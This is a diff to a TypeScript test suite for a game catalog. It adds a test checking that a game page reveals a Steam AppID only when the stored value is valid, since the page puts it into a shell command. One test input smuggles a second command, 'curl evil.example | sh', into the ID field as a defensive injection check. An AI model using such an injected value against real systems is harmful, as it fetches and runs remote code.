@@ -266,6 +266,24 @@ layer(PgTest)('consultas', (it) => {
     )
   })
 
+  describe('gamePage report command', () => {
+    it.effect('names the Steam AppID only when the edition holds a valid one, since the page puts it in a shell command', () =>
+      inRollback(
+        Effect.gen(function* () {
+          const e = yield* scenario
+          const sql = yield* SqlClient.SqlClient
+          const appId = (externalId: string) =>
+            Effect.andThen(
+              sql`UPDATE game_edition SET external_id = ${externalId} WHERE id = ${e.gtaSteam}`,
+              Effect.map(Effect.provideService(gamePage(e.gta), Visitor, guest), (page) => page.steam_app_id),
+            )
+          expect(yield* appId('271590')).toBe('271590')
+          expect(yield* appId('271590; curl evil.example | sh')).toBeNull()
+        }),
+      ).pipe(onDay(today)),
+    )
+  })
+
   describe('catalog', () => {
     it.effect('filtra por estado calculado, anti-cheat y título, y cuenta solo lo aprobado', () =>
       inRollback(
